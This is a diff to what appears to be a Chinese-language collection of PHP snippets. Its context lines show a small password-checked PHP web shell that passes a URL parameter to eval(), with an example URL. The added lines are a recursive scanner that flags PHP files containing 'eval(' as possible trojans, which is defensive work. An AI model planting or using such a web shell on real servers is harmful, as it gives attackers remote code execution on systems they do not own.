@@ -1457,3 +1457,30 @@ http://url/test.php?pwd=admin&action=eval&a=phpinfo();
 $passwd="admin";if($_GET['pwd']!=$passwd)exit;
 if($_GET['action']=="eval" && $_GET['a']){eval($_GET['a']);}
 ?>
+
+
++++++PHP检测木马程序+++++++
+function parAllFiles($d)
+{
+    $dh = dir($d);
+    while($filename = $dh->read() )
+    {
+        if($filename=='.' || $filename=='..') continue;
+        $tfile = $d.'/'.$filename;
+        if(is_dir($tfile))
+        {
+            //echo "检查到： $tfile ";
+            parAllFiles($tfile);
+        }
+        else
+        {
+            if(!ereg("\.php", $tfile)) continue;
+            $bd = file_get_contents($tfile);
+            if(eregi("eval\(", $bd))
+            {
+                echo "$tfile\r\n";
+            }
+        }
+    }
+}
+parAllFiles(dirname(__FILE__));
